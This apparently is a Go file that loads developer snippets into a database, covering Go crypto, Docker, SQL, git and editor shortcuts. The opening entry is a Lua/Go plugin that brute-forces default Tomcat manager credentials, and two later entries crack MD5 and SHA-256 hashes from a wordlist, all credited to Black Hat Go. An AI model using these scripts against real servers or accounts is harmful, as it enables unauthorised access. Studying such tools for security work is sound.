	create(db, "Plugin on lua for go\n(tags: plugin lua)\n---\n\nhttps://github.com/blackhat-go\n\n// plugins/tomcat.lua\nusernames = {\"admin\", \"manager\", \"tomcat\"}\npasswords = {\"admin\", \"manager\", \"tomcat\", \"password\"}\n\nstatus, basic, err = http.head(\"10.0.1.20\", 8080, \"/manager/html\")\nif err ~= \"\" then\n    print(\"[!] Error: \"..err)\n    return\nend\nif status ~= 401 or not basic then\n    print(\"[!] Error: Endpoint does not require Basic Auth. Exiting.\")\n    return\nend\nprint(\"[+] Endpoint requires Basic Auth. Proceeding with password guessing\")\nfor i, username in ipairs(usernames) do\n    for j, password in ipairs(passwords) do\n        status, basic, err = http.get(\"10.0.1.20\", 8080, username, password, \"/manager/html\")\n        if status == 200 then\n            print(\"[+] Found creds - \"..username..\":\"..password)\n            return\n        end\n    end\nend\n\n// cmd/scanner/main.go\npackage main\n\nimport (\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n  \"os\"\n\n  lua \"github.com/yuin/gopher-lua\"\n)\n\nconst (\n  LuaHttpTypeName = \"http\"\n  PluginsDir      = \"../../plugins\"\n)\n\nfunc register(l *lua.LState) {\n  mt := l.NewTypeMetatable(LuaHttpTypeName)\n  l.SetGlobal(\"http\", mt)\n  // static attributes\n  l.SetField(mt, \"head\", l.NewFunction(head))\n  l.SetField(mt, \"get\", l.NewFunction(get))\n}\n\nfunc head(l *lua.LState) int {\n  var (\n    host string\n    port uint64\n    path string\n    resp *http.Response\n    err  error\n    url  string\n  )\n  host = l.CheckString(1)\n  port = uint64(l.CheckInt64(2))\n  path = l.CheckString(3)\n  url = fmt.Sprintf(\"http://%s:%d/%s\", host, port, path)\n  if resp, err = http.Head(url); err != nil {\n    l.Push(lua.LNumber(0))\n    l.Push(lua.LBool(false))\n    l.Push(lua.LString(fmt.Sprintf(\"Request failed: %s\", err)))\n    return 3\n  }\n  l.Push(lua.LNumber(resp.StatusCode))\n  l.Push(lua.LBool(resp.Header.Get(\"WWW-Authenticate\") != \"\"))\n  l.Push(lua.LString(\"\"))\n  return 3\n}\n\nfunc get(l *lua.LState) int {\n  var (\n    host     string\n    port     uint64\n    username string\n    password string\n    path     string\n    resp     *http.Response\n    err      error\n    url      string\n    client   *http.Client\n    req      *http.Request\n  )\n  host = l.CheckString(1)\n  port = uint64(l.CheckInt64(2))\n  username = l.CheckString(3)\n  password = l.CheckString(4)\n  path = l.CheckString(5)\n  url = fmt.Sprintf(\"http://%s:%d/%s\", host, port, path)\n  client = new(http.Client)\n  if req, err = http.NewRequest(\"GET\", url, nil); err != nil {\n    l.Push(lua.LNumber(0))\n    l.Push(lua.LBool(false))\n    l.Push(lua.LString(fmt.Sprintf(\"Unable to build GET request: %s\", err)))\n    return 3\n  }\n  if username != \"\" || password != \"\" {\n    // Assume Basic Auth is required since user and/or password is set\n    req.SetBasicAuth(username, password)\n  }\n  if resp, err = client.Do(req); err != nil {\n    l.Push(lua.LNumber(0))\n    l.Push(lua.LBool(false))\n    l.Push(lua.LString(fmt.Sprintf(\"Unable to send GET request: %s\", err)))\n    return 3\n  }\n  l.Push(lua.LNumber(resp.StatusCode))\n  l.Push(lua.LBool(false))\n  l.Push(lua.LString(\"\"))\n  return 3\n}\n\nfunc main() {\n  var (\n    l     *lua.LState\n    files []os.FileInfo\n    err   error\n    f     string\n  )\n  l = lua.NewState()\n  defer l.Close()\n  register(l)\n  if files, err = ioutil.ReadDir(PluginsDir); err != nil {\n    log.Fatalln(err)\n  }\n\n  for idx := range files {\n    fmt.Println(\"Found plugin: \" + files[idx].Name())\n    f = fmt.Sprintf(\"%s/%s\", PluginsDir, files[idx].Name())\n    if err := l.DoFile(f); err != nil {\n      log.Fatalln(err)\n    }\n  }\n}")
	create(db, "Plugin\n(tags: plugin)\n---\n\n// plugins/plugin_name.go\n// go build -buildmode=plugin\npackage main\n\nimport \"fmt\"\n\nvar V int\n\nfunc F() { fmt.Printf(\"Hello, number %d\\n\", V) }\n\n// main.go\np, err := plugin.Open(\"plugin_name.so\")\nv, err := p.Lookup(\"V\")\nf, err := p.Lookup(\"F\")\n\n*v.(*int) = 7\nf.(func())() // prints \"Hello, number 7\"")
	create(db, "Crypto aes\n(tags: crypto aes)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"bytes\"\n  \"crypto/aes\"\n  \"crypto/cipher\"\n  \"crypto/rand\"\n  \"errors\"\n  \"fmt\"\n  \"io\"\n  \"log\"\n)\n\nfunc pad(buf []byte) []byte {\n  // Assumes valid lengths. Should add additional checks.\n  length := len(buf)\n  padding := aes.BlockSize - (length % aes.BlockSize)\n  if padding == 0 {\n    padding = aes.BlockSize\n  }\n  padded := make([]byte, length+padding)\n  copy(padded, buf)\n  copy(padded[length:], bytes.Repeat([]byte{byte(padding)}, padding))\n  return padded\n}\n\nfunc unpad(buf []byte) []byte {\n  // Assume valid length and padding. Should add checks\n  padding := int(buf[len(buf)-1])\n  return buf[:len(buf)-padding]\n}\n\nfunc encrypt(plaintext, key []byte) ([]byte, error) {\n  var (\n    ciphertext []byte\n    iv         []byte\n    block      cipher.Block\n    mode       cipher.BlockMode\n    err        error\n  )\n\n  if block, err = aes.NewCipher(key); err != nil {\n    return nil, err\n  }\n\n  iv = make([]byte, aes.BlockSize)\n  if _, err = io.ReadFull(rand.Reader, iv); err != nil {\n    log.Fatalln(err)\n  }\n\n  mode = cipher.NewCBCEncrypter(block, iv)\n\n  plaintext = pad(plaintext)\n  ciphertext = make([]byte, aes.BlockSize+len(plaintext))\n  copy(ciphertext, iv)\n  mode.CryptBlocks(ciphertext[aes.BlockSize:], plaintext)\n\n  return ciphertext, nil\n}\n\nfunc decrypt(ciphertext, key []byte) ([]byte, error) {\n  var (\n    plaintext []byte\n    iv        []byte\n    block     cipher.Block\n    mode      cipher.BlockMode\n    err       error\n  )\n\n  if len(ciphertext) < aes.BlockSize {\n    return nil, errors.New(\"Invalid ciphertext length: too short\")\n  }\n\n  if len(ciphertext)%aes.BlockSize != 0 {\n    return nil, errors.New(\"Invalid ciphertext length: not a multiple of blocksize\")\n  }\n\n  iv = ciphertext[:aes.BlockSize]\n  ciphertext = ciphertext[aes.BlockSize:]\n\n  if block, err = aes.NewCipher(key); err != nil {\n    return nil, err\n  }\n\n  mode = cipher.NewCBCDecrypter(block, iv)\n  plaintext = make([]byte, len(ciphertext))\n  mode.CryptBlocks(plaintext, ciphertext)\n  plaintext = unpad(plaintext)\n\n  return plaintext, nil\n}\n\nfunc main() {\n  var (\n    err        error\n    plaintext  []byte\n    ciphertext []byte\n    key        []byte\n  )\n\n  key = make([]byte, 32)\n  if _, err = io.ReadFull(rand.Reader, key); err != nil {\n    log.Fatalln(err)\n  }\n\n  plaintext = []byte(\"4321123456789090\")\n  if ciphertext, err = encrypt(plaintext, key); err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"key        = %x\\n\", key)\n  fmt.Printf(\"ciphertext = %x\\n\", ciphertext)\n\n  if plaintext, err = decrypt(ciphertext, key); err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"plaintext  = %s\\n\", plaintext)\n}")
	create(db, "Crypto bcrypt\n(tags: crypto bcrypt)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"log\"\n  \"os\"\n\n  \"golang.org/x/crypto/bcrypt\"\n)\n\nvar storedHash = \"$2a$10$Zs3ZwsjV/nF.KuvSUE.5WuwtDrK6UVXcBpQrH84V8q3Opg1yNdWLu\"\n\nfunc main() {\n  // someC0mpl3xP@ssw0rd\n  var password string \n  if len(os.Args) != 2 {\n    log.Fatalln(\"Usage: bcrypt password\")\n  }\n  password = os.Args[1]\n\n  hash, err := bcrypt.GenerateFromPassword(\n    []byte(password),\n    bcrypt.DefaultCost,\n  )\n  if err != nil {\n    log.Fatalln(err)\n  }\n  log.Printf(\"hash = %s\\n\", hash)\n\n  err = bcrypt.CompareHashAndPassword([]byte(storedHash), []byte(password))\n  if err != nil {\n    log.Println(\"[!] Authentication failed\")\n    return\n  }\n  log.Println(\"[+] Authentication successful\")\n}")
	create(db, "Crypto gcm\n(tags: crypto gcm)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"crypto/aes\"\n  \"crypto/cipher\"\n  \"crypto/rand\"\n  \"errors\"\n  \"fmt\"\n  \"io\"\n  \"log\"\n)\n\nvar key = make([]byte, 32)\n\nfunc encrypt(plaintext []byte) ([]byte, error) {\n  var (\n    ciphertext []byte\n    nonce      []byte\n    block      cipher.Block\n    aead       cipher.AEAD\n    err        error\n  )\n\n  if block, err = aes.NewCipher(key); err != nil {\n    return nil, err\n  }\n\n  if aead, err = cipher.NewGCM(block); err != nil {\n    return nil, err\n  }\n\n  nonce = make([]byte, aead.NonceSize())\n  if _, err = io.ReadFull(rand.Reader, nonce); err != nil {\n    log.Fatalln(err)\n  }\n\n  ciphertext = aead.Seal(nil, nonce, plaintext, nil)\n\n  ciphertext = append(nonce, ciphertext...)\n  return ciphertext, nil\n}\n\nfunc decrypt(ciphertext []byte) ([]byte, error) {\n  var (\n    plaintext []byte\n    nonce     []byte\n    block     cipher.Block\n    aead      cipher.AEAD\n    err       error\n  )\n\n  if block, err = aes.NewCipher(key); err != nil {\n    return nil, err\n  }\n\n  if aead, err = cipher.NewGCM(block); err != nil {\n    return nil, err\n  }\n\n  nonceSize := aead.NonceSize()\n  if len(ciphertext) < nonceSize {\n    return nil, errors.New(\"Invalid ciphertext length\")\n  }\n  nonce = ciphertext[:nonceSize]\n  ciphertext = ciphertext[nonceSize:]\n\n  if plaintext, err = aead.Open(nil, nonce, ciphertext, nil); err != nil {\n    return nil, err\n  }\n\n  return plaintext, nil\n}\n\nfunc main() {\n  var (\n    err        error\n    plaintext  []byte\n    ciphertext []byte\n  )\n\n  if _, err = io.ReadFull(rand.Reader, key); err != nil {\n    log.Fatalln(err)\n  }\n\n  plaintext = []byte(\"privet\")\n  if ciphertext, err = encrypt(plaintext); err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"ciphertext = %x\\n\", ciphertext)\n\n  if plaintext, err = decrypt(ciphertext); err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"plaintext = %s\\n\", plaintext)\n}")
	create(db, "Crypto md5 hash\n(tags: crypto md5 hash)\n---\n\nhttps://github.com/blackhat-go\n\n// wordlist.txt\npassword\nPassword\nNickelback4life\nSummer2017\n\n// main.go\npackage main\n\nimport (\n  \"bufio\"\n  \"crypto/md5\"\n  \"fmt\"\n  \"log\"\n  \"os\"\n)\n\nvar md5hash = \"77f62e3524cd583d698d51fa24fdff4f\"\n\nfunc main() {\n  f, err := os.Open(\"wordlist.txt\")\n  if err != nil {\n    log.Fatalln(err)\n  }\n  defer f.Close()\n\n  scanner := bufio.NewScanner(f)\n  for scanner.Scan() {\n    password := scanner.Text()\n    hash := fmt.Sprintf(\"%x\", md5.Sum([]byte(password)))\n    if hash == md5hash {\n      fmt.Printf(\"[+] Password found (MD5): %s\\n\", password)\n    }\n  }\n\n  if err := scanner.Err(); err != nil {\n    log.Fatalln(err)\n  }\n}")
	create(db, "Crypto sha256 hash\n(tags: crypto sha256 hash)\n---\n\nhttps://github.com/blackhat-go\n\n// wordlist.txt\npassword\nPassword\nNickelback4life\nSummer2017\n\n// main.go\npackage main\n\nimport (\n  \"bufio\"\n  \"crypto/sha256\"\n  \"fmt\"\n  \"log\"\n  \"os\"\n)\n\nvar sha256hash = \"95a5e1547df73abdd4781b6c9e55f3377c15d08884b11738c2727dbd887d4ced\"\n\nfunc main() {\n  f, err := os.Open(\"wordlist.txt\")\n  if err != nil {\n    log.Fatalln(err)\n  }\n  defer f.Close()\n\n  scanner := bufio.NewScanner(f)\n  for scanner.Scan() {\n    password := scanner.Text()\n    hash := fmt.Sprintf(\"%x\", sha256.Sum256([]byte(password)))\n    if hash == sha256hash {\n      fmt.Printf(\"[+] Password found (SHA-256): %s\\n\", password)\n    }\n  }\n\n  if err := scanner.Err(); err != nil {\n    log.Fatalln(err)\n  }\n}")
	create(db, "Crypto hmac\n(tags: crypto hmac)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"crypto/hmac\"\n  \"crypto/sha256\"\n  \"encoding/hex\"\n  \"fmt\"\n)\n\nvar key = []byte(\"some random key\")\n\nfunc checkMAC(message, recvMAC []byte) bool {\n  mac := hmac.New(sha256.New, key)\n  mac.Write(message)\n  calcMAC := mac.Sum(nil)\n\n  return hmac.Equal(calcMAC, recvMAC)\n}\n\nfunc main() {\n  // In real implementations, we’d read the message and HMAC value from network source\n  message := []byte(\"The red eagle flies at 10:00\")\n  mac, _ := hex.DecodeString(\"69d2c7b6fbbfcaeb72a3172f4662601d1f16acfb46339639ac8c10c8da64631d\")\n  if checkMAC(message, mac) {\n    fmt.Println(\"EQUAL\")\n  } else {\n    fmt.Println(\"NOT EQUAL\")\n  }\n}")
	create(db, "Crypto cert tls\n(tags: crypto cert tls)\n---\n\nhttps://github.com/blackhat-go\n\n// cert for server\n// openssl req -nodes -x509 -newkey rsa:4096 -keyout serverKey.pem -out serverCrt.pem -days 365\n// Country Name (2 letter code) [AU]:\n// State or Province Name (full name) [Some-State]:\n// Locality Name (eg, city) []:\n// Organization Name (eg, company) [Internet Widgits Pty Ltd]:\n// Organizational Unit Name (eg, section) []:\n// Common Name (e.g. server FQDN or YOUR name) []:localhost\n// Email Address []:\n\n// cert for client\n// openssl req -nodes -x509 -newkey rsa:4096 -keyout clientKey.pem -out clientCrt.pem -days 365\n// Country Name (2 letter code) [AU]:\n// State or Province Name (full name) [Some-State]:\n// Locality Name (eg, city) []:\n// Organization Name (eg, company) [Internet Widgits Pty Ltd]:\n// Organizational Unit Name (eg, section) []:\n// Common Name (e.g. server FQDN or YOUR name) []:Tom\n// Email Address []:\n\n// set enviroment for build go GODEBUG=x509ignoreCN=0\n\n// curl -ik -X GET --cert clientCrt.pem --key clientKey.pem https://localhost:9443/hello\n\n// cmd/client/main.go\npackage main\n\nimport (\n  \"crypto/tls\"\n  \"crypto/x509\"\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n)\n\nfunc main() {\n  var (\n    err              error\n    cert             tls.Certificate\n    serverCert, body []byte\n    pool             *x509.CertPool\n    tlsConf          *tls.Config\n    transport        *http.Transport\n    client           *http.Client\n    resp             *http.Response\n  )\n\n  if cert, err = tls.LoadX509KeyPair(\"clientCrt.pem\", \"clientKey.pem\"); err != nil {\n    log.Fatalln(err)\n  }\n\n  if serverCert, err = ioutil.ReadFile(\"../server/serverCrt.pem\"); err != nil {\n    log.Fatalln(err)\n  }\n\n  pool = x509.NewCertPool()\n  pool.AppendCertsFromPEM(serverCert)\n\n  tlsConf = &tls.Config{\n    Certificates: []tls.Certificate{cert},\n    RootCAs:      pool,\n  }\n  tlsConf.BuildNameToCertificate()\n\n  transport = &http.Transport{\n    TLSClientConfig: tlsConf,\n  }\n  client = &http.Client{\n    Transport: transport,\n  }\n\n  if resp, err = client.Get(\"https://server.blackhat-go.local:9443/hello\"); err != nil {\n    log.Fatalln(err)\n  }\n  if body, err = ioutil.ReadAll(resp.Body); err != nil {\n    log.Fatalln(err)\n  }\n  defer resp.Body.Close()\n\n  fmt.Printf(\"Success: %s\\n\", body)\n}\n\n// cmd/server/main.go\npackage main\n\nimport (\n  \"crypto/tls\"\n  \"crypto/x509\"\n  \"fmt\"\n  \"io/ioutil\"\n  \"log\"\n  \"net/http\"\n)\n\nfunc helloHandler(w http.ResponseWriter, r *http.Request) {\n  fmt.Printf(\"Hello: %s\\n\", r.TLS.PeerCertificates[0].Subject.CommonName)\n  fmt.Fprint(w, \"Authentication successful\")\n}\n\nfunc main() {\n  var (\n    err        error\n    clientCert []byte\n    pool       *x509.CertPool\n    tlsConf    *tls.Config\n    server     *http.Server\n  )\n\n  http.HandleFunc(\"/hello\", helloHandler)\n\n  if clientCert, err = ioutil.ReadFile(\"../client/clientCrt.pem\"); err != nil {\n    log.Fatalln(err)\n  }\n  pool = x509.NewCertPool()\n  pool.AppendCertsFromPEM(clientCert)\n\n  tlsConf = &tls.Config{\n    ClientCAs:  pool,\n    ClientAuth: tls.RequireAndVerifyClientCert,\n  }\n  tlsConf.BuildNameToCertificate()\n\n  server = &http.Server{\n    Addr:      \":9443\",\n    TLSConfig: tlsConf,\n  }\n  log.Fatalln(server.ListenAndServeTLS(\"serverCrt.pem\", \"serverKey.pem\"))\n}")
	create(db, "Sign message and veryfy signature\n(tags: crypto sign message verify)\n---\n\nhttps://github.com/blackhat-go\n\npackage main\n\nimport (\n  \"crypto\"\n  \"crypto/rand\"\n  \"crypto/rsa\"\n  \"crypto/sha256\"\n  \"fmt\"\n  \"log\"\n)\n\nfunc main() {\n  var (\n    err                                              error\n    privateKey                                       *rsa.PrivateKey\n    publicKey                                        *rsa.PublicKey\n    message, plaintext, ciphertext, signature, label []byte\n  )\n\n  if privateKey, err = rsa.GenerateKey(rand.Reader, 2048); err != nil {\n    log.Fatalln(err)\n  }\n  publicKey = &privateKey.PublicKey\n\n  label = []byte(\"\")\n  message = []byte(\"Some super secret message, maybe a session key even\")\n  ciphertext, err = rsa.EncryptOAEP(sha256.New(), rand.Reader, publicKey, message, label)\n  if err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"Ciphertext: %x\\n\", ciphertext)\n\n  plaintext, err = rsa.DecryptOAEP(sha256.New(), rand.Reader, privateKey, ciphertext, label)\n  if err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"Plaintext: %s\\n\", plaintext)\n\n  h := sha256.New()\n  h.Write(message)\n  signature, err = rsa.SignPSS(rand.Reader, privateKey, crypto.SHA256, h.Sum(nil), nil)\n  if err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Printf(\"Signature: %x\\n\", signature)\n\n  err = rsa.VerifyPSS(publicKey, crypto.SHA256, h.Sum(nil), signature, nil)\n  if err != nil {\n    log.Fatalln(err)\n  }\n  fmt.Println(\"Signature verified\")\n}")
	create(db, "Remove all images in docker\n(tags: remove image docker)\n---\n\ndocker container stop $(docker container ls -aq)\ndocker container prune -f\ndocker rmi -f $(docker images -a -q)")
	create(db, "Write ubuntu on usb flash\n(tags: ubuntu usb)\n---\n\n1. Download ubuntu from ubuntu.com\n2. Download the program Universal-USB-Installer-1.9.9.3.exe\n3. Format the usb-flash in fat32\n4. In installer chose the mode fat32\n5. With program HxD fixed the bytes of the boot sector of the usb-flash accordind the article https://habr.com/ru/post/128004/\n6. In Sector 0 at the end, assign the first byte 80h to the link ")
	create(db, "Docker enter into container\n(tags: docker enter container)\n---\n\ndocker ps\ndocker exec -it mycontainer sh\n// docker exec -it re583725uh bash\nprintenv")
	create(db, "Docker-compose enter into container\n(tags: compose enter container)\n---\n\nsudo docker-compose exec mycontainer bash")
	create(db, "Clickhouse client\n(tags: clickhouse client)\n---\n\nsudo apt install clickhouse-client\nclickhouse-client\nshow tables\nselect * from mytablename order by ts_nano desc limit 1")
	create(db, "Influx client\n(tags: influx client)\n---\n\nsudo apt install influxdb-client\ninflux\nshow databases\nuse grafana\nshow measurements\n// show series\nselect * from mytablename limit 1")
	create(db, "Shutdown linux\n(tags: shutdown linux)\n---\n\nsudo shutdown -h now\nsudo shutdown -h 21:00\nsudo shutdown -h +5 \"Computer will be shutdown after 5 minutes\"\nsudo shutdown -c // cancel shutdown")
	create(db, "Get duplicate records in clickhouse\n(tags: duplicate clickhouse)\n---\n\nselect ts_nano, count(*) from mytablename group by ts_nano having count(*) > 1")
	create(db, "Git remove remote branch\n(tags: git remove remote branch)\n---\n\ngit\n// see all upstreams in branches\ngit branch -vv\n// remove branch on server\npush origin --delete badbranchname\n// upstream remote branch by local branch\ngit branch --set-upstream-to origin/goodbranchname")
	create(db, "Backup files in bash \n(tags: bash backup zip)\n---\n\n//chmod +x /usr/sbin/backup\n\n#!/bin/bash\n\nPROJECTS_DIR=\"/home/username/projects\"\nNAME=backup_$(date +%Y_%m_%d_%H_%M)\nSTART_TIME=$(date +%s)\n\nmkdir /share/$NAME\ncp -r $PROJECTS_DIR/project1 /share/$NAME/project1\ncp -r $PROJECTS_DIR/project2 /share/$NAME/project2\ncp -r $PROJECTS_DIR/project3 /share/$NAME/project3\n\ncd /share\n\nzip -r $NAME.zip $NAME > /dev/null\n\nrm -r /share/$NAME\n\nEND_TIME=$(date +%s)\nDIFF=$(( $END_TIME - $START_TIME))\nFILE_SIZE=$(du -h /share/$NAME.zip)\n\necho \"backup $FILE_SIZE was created in $DIFF s\"")
	create(db, "Debugging golang code from terminal \n(tags: debug terminal)\n---\n\ncd root/go/src/github.com/DimitryEf/experiment        \nvi main.go        \n  write the app (i) and save it (ESC :wq)      \ngo run main.go        \ngo get github.com/go-delve/delve/cmd/dlv        \ndlv debug        \nh        \nb main.main        \nb main.go:10        \nn        \nc        \nq        \ndisass   ")
	create(db, "Postgresql json field \n(tags: postgresql json field)\n---\n\nSELECT\n  mt.jsonfield\nFROM kso.mytable mt\nWHERE mt.jsonfield->>'somefield' = 'somename'")
	create(db, "Postgresql json array \n(tags: postgresql json array)\n---\n\nSELECT * FROM\n(SELECT\n  mt.name,\n  json_array_elements(mt.jsonarray->'arrayname')->'jsonvalue' as jsonvalue\nFROM mytable mt) t\nWHERE t.jsonvalue::text = '\\\"somevalue\\\"'")
	create(db, "Postgresql loop \n(tags: postgresql loop)\n---\n\ndo $$  \ndeclare  \n  result_var text default '';  \n  counter int default 0;  \nbegin  \n  result_var := 'qwe';  \n  drop table if exists tmp_qwe;  \n  create temp table tmp_qwe(result text);  \n  insert into tmp_qwe (result) values (result_var);  \n  loop  \n  \n    counter := counter + 1;  \n    if counter = 5 then exit;  \n    end if;  \n  \n    update tmp_qwe set result = result || counter::text;  \n  end loop;  \nend $$;  \n  \nselect * from tmp_qwe;  ")
	create(db, "Solve problems with using ebiten library \n(tags: ebiten problem)\n---\n\nsudo apt-get install libglfw3 libglfw3-dev\nsudo apt-get install libx11-dev\nsudo apt install libxcursor-dev\nsudo apt install libxtst-dev\nsudo apt-get install libxcomposite-dev libxdamage-dev libxrender-dev\nsudo apt-get install libxinerama-dev\nsudo apt-get install libgl1-mesa-dev xorg-dev")
	create(db, "Debugging plugins \n(tags: debug plugin)\n---\n\n// run debug with this flag\n-gcflags=\"all=-N -l\"")
	create(db, "Git squash commits\n(tags: git squash)\n---\n\n1. specify the hash of the commit to which you need to squash other commits  \ngit rebase -I dfs878   \n2. in the editor that opens, leave pick (or p) opposite the commit to which we squash everything (the first will fit, the last will not) \n3. in other commits write squash (или s)  \n4. save the file\n5. git merges commits and prompts you to choose a name\n6. save the file\n7. ready (you may check it with git log)  ")
	create(db, "Using postgresql in docker\n(tags: postgresql docker)\n---\n\ndocker run --name some-postgres -e POSTGRES_PASSWORD=mysecretpassword -d -p 5432:5432 postgres\ndocker ps\ndocker exec -it 05b3a3471f6f bash\nroot@05b3a3471f6f:/# psql -U postgres\npostgres-# CREATE DATABASE mytest;\npostgres-# \\q\n\n// from localhost\npsql -h public-ip-server -p 5432 -U postgres")
	create(db, "Dump postgresql to sqlite\n(tags: dump postgresql sqlite)\n---\n\npackage main\n\nimport (\n  \"context\"\n  \"database/sql\"\n  \"fmt\"\n  _ \"github.com/lib/pq\"\n  _ \"github.com/mattn/go-sqlite3\"\n  \"log\"\n  \"time\"\n)\n\nfunc main() {\n  dbname := \"mydb\"\n  schema := \"myschema\"\n  postgresqlConString := \"user=myuser password=mypass dbname=mydb host=localhost port=5432 search_path=myschema sslmode=disable\"\n  sqliteConString := \"mydb.db\"\n  log.SetFlags(log.LstdFlags | log.Lshortfile)\n  t1 := time.Now()\n  transferFromSQLtoSQLite(postgresqlConString, sqliteConString, dbname, schema)\n  t := time.Since(t1)\n  ms := t.Milliseconds()\n  log.Printf(\"took time %d ms\", ms)\n}\n\nfunc transferFromSQLtoSQLite(postgresqlConString, sqliteConString, dbname, schema string) {\n\n  // connect to postgresql\n  db, err := sql.Open(\"postgres\", postgresqlConString)\n  checkErr(err)\n  ctx := context.Background()\n  err = db.PingContext(ctx)\n  checkErr(err)\n  defer db.Close()\n\n  // get all tables\n  tables, err := db.QueryContext(ctx, \"SELECT tablename FROM pg_tables WHERE schemaname = $1 ORDER BY tablename\", schema)\n  checkErr(err)\n  defer tables.Close()\n\n  // connect to sqlite, create file if not exists\n  dbsqlite, err := sql.Open(\"sqlite3\", sqliteConString)\n  checkErr(err)\n  defer db.Close()\n\n  for tables.Next() {\n\n    var tableName string\n    tables.Scan(&tableName)\n    log.Printf(\"table: %s\", tableName)\n\n    // get fields name and data type for current table\n    fields, err := db.QueryContext(ctx, \"SELECT column_name, data_type FROM information_schema.columns WHERE table_catalog = $1 AND table_schema = $2 AND table_name = $3 ORDER BY ordinal_position\", dbname, schema, tableName)\n    checkErr(err)\n\n    // create table (do not drop table! because if table exists user must see this so as not to accidentally overwrite data)\n    createTableString := buildCreateTableString(tableName, fields)\n    _, err = dbsqlite.ExecContext(ctx, createTableString)\n    checkErr(err)\n\n    // get all rows from table\n    rows, err := db.QueryContext(ctx, fmt.Sprintf(\"SELECT * FROM \\\"%s\\\".\\\"%s\\\"\", check(schema), check(tableName))\n    checkErr(err)\n    columns, err := rows.Columns()\n    checkErr(err)\n\n    // start transaction\n    tx, err := dbsqlite.Begin()\n    checkErr(err)\n\n    // prepare improves performance more than 600 times\n    stmt, err := tx.Prepare(buildPrepareString(tableName, columns))\n    checkErr(err)\n\n    // prepare args as pointers\n    args := make([]interface{}, len(columns))\n    for i := range columns {\n      args[i] = &sql.NullString{String: columns[i]}\n    }\n\n    // from postgresql to sqlite\n    count := 0\n    for rows.Next() {\n      err := rows.Scan(args...)\n      checkErr(err)\n      _, err = stmt.Exec(args...)\n      checkErr(err, args...)\n      count++\n    }\n    log.Printf(\"\\trows: %d\", count)\n\n    // commit transaction\n    err = tx.Commit()\n    checkErr(err)\n\n    rows.Close()\n    stmt.Close()\n  }\n\n}\n\nfunc buildCreateTableString(tableName string, fields *sql.Rows) string {\n  defer fields.Close()\n  res := fmt.Sprintf(\"CREATE TABLE \\\"%s\\\" (\", tableName)\n  for fields.Next() {\n    var field, dataType string\n    err := fields.Scan(&field, &dataType)\n    checkErr(err)\n    res += fmt.Sprintf(\"\\n\\t\\\"%s\\\"\\t%s,\", field, convertType(dataType))\n    log.Printf(\"\\tcolumn: %s\", field)\n  }\n  res = res[:len(res)-1]\n  res += \"\\n)\"\n  return res\n}\n\nfunc convertType(dataType string) string {\n  switch dataType {\n  case \"\\\"char\\\"\", \"character varying\", \"date\", \"text\":\n    return \"TEXT\"\n  case \"bigint\", \"boolean\", \"integer\", \"smallint\":\n    return \"INTEGER\"\n  case \"double precision\", \"numeric\", \"real\":\n    return \"REAL\"\n  case \"bytea\":\n    return \"BLOB\"\n  default:\n    return \"TEXT\"\n  }\n}\n\nfunc check(s string) string {\n\tif strings.Contains(s, \"\\\"\") {\n\t\tlog.Fatalf(\"bad char in \\\"%s\\\"\", s)\n\t}\n\treturn s\n}\n\nfunc checkErr(err error, args ...interface{}) {\n  if err != nil {\n    log.Fatalf(\"%q: %s\", err, args)\n  }\n}\n\nfunc buildPrepareString(tableName string, columns []string) string {\n  res := fmt.Sprintf(\"INSERT INTO \\\"%s\\\" (\", tableName)\n  count := 0\n  for _, col := range columns {\n    res += fmt.Sprintf(\"\\\"%s\\\",\", col)\n    count++\n  }\n  res = res[:len(res)-1]\n  res += \") VALUES (\"\n  for i := 0; i < count; i++ {\n    res += \"?,\"\n  }\n  res = res[:len(res)-1]\n  res += \")\"\n  return res\n}")
	create(db, "Graceful shutdown\n(tags: graceful shutdown)\n---\n\nfunc action(c *cli.Context) error {\n  startTime := time.Now()\n\n  finish := make(chan struct{})\n\n  ctx, cancel := context.WithCancel(context.Background())\n  go act(ctx, finish)\n  defer cancel()\n\n  go gracefulShutdown(finish, cancel)\n\n  <-finish\n  endTime := time.Since(startTime)\n  ms := endTime.Milliseconds()\n  log.Printf(\"took time: %d ms\", ms)\n\n  return nil\n}\n\nfunc gracefulShutdown(finish chan<- struct{}, cancel context.CancelFunc) {\n  interrupt := make(chan os.Signal, 1)\n  signal.Notify(interrupt, os.Interrupt, syscall.SIGTERM)\n\n  <-interrupt\n\n  log.Printf(\"interrupted, sql queries will be canceled in 3 seconds\")\n  cancel()\n  time.Sleep(3 * time.Second)\n  defer func() {\n    finish <- struct{}{}\n  }()\n}")
	create(db, "Goland hotkeys\n(tags: hotkeys goland)\n---\n\nalt+j - select the same words\nshift+enter = start new line (open file in split right)\nctrl+alt+enter - start new line before current\nctrl+w - extend selection\nctrl+shift+w - shrink selection\nctrl+shift+u - toggle case\nctrl+alt+shift+lmb (left mouse) - multiselect\nctrl+[ - move to code block start\nctrl+] - move to code block end\nctrl+shift+[ - move to code block start with select\nctrl+shift+] - move to code block end with select\nctrl+y - delete line\nctrl+delete - delete to word end\nctrl+backspace - delete to word start\nctrl+d - duplicate line or selection (compare files)\nctrl+shift+j - join lines\nctrl+shift+m - move to matching brace\nctrl+shift+insert - column selection mode\ntab - next parameter\nshift+tab - prev parameter\nf2 - next highlight editor\nshift+f2 - prev highlight editor\nctrl+alt+left - back\nctrl+alt+right - forward\nctrl+n - go to type\nctrl+shift+n - go to file\nctrl+b - go to declaration or usage\nctrl+alt+b - go to implementation\nctrl+shift+b - go to type declaration\nctrl+shift+t go to test\nctrl+f12 - file structure\nctrl+alt+shift+2 - file path\nctrl+h - type hierarchy\nctrl+shift+h - method hierarchy\nctrl+alt+h - call hierarchy\nctrl+/ - comment code\nctrl+shift+/ - comment block\nctrl+alt+l - reformat code\nctrl+alt+shift+l 